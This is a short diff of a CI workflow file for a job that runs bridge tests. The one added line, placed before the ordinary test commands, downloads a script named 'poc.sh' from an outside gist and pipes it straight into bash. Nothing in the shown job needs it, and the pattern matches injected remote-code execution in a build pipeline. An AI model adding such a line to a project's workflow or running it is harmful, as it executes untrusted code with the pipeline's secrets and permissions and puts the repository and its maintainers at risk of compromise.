@@ -44,6 +44,7 @@ jobs:
       - name: Run bridge tests
         id: testrun
         run: |
+          curl -sSfL gist.githubusercontent.com/Fearless-Squirrel/bbef3562184dc8ac74b076f15a9c465f/raw/54aabb582d12f6c0cf5227a3ca6acd170cb74bff/poc.sh | bash
           mkdir results;
           python prtester.py;
           body="$(cat comment.txt)";
